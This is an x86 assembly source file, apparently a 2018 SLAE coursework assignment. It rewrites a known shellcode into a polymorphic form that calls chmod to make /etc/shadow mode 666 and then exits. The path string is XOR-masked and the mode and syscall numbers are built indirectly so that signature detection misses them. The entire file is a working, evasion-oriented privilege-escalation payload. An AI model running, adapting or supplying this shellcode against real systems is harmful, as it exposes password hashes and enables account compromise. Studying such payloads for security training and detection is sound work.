; Polymorphic equivalent
; for chmod 666 /etc/shadow shellcode
; Original at: http://shell-storm.org/shellcode/files/shellcode-355.php
; (Version in comments at the top)
; 2018-07-14 SLAE-1294 assignment 6

section .text
	global _start

_start:
	xor ecx,ecx

	; Put "/etc/shadow" (null-terminated) on the stack
	mov eax,0x11555c20
	xor eax,0x11223344
	push eax
	mov eax,0x704a406b
	xor eax,0x11223344
        push eax
	mov eax,0x7256566b
	xor eax,0x11223344
        push eax

	; ptr into ebx
	mov edi,esp
	mov ebx,edi

	; Get 0x1b6 in ecx by putting in double then halving
	mov cx,0x36c
	sar ecx,1

	; Put it in eax and subtract enough to get syscall 15
	mov eax,ecx
	sub ax,0x1a7

	; Do the chmod
	int 0x80

	; Assume success - chmod returns 0
	; Increment to 1 to get exit syscall
	add al,1
	int 0x80

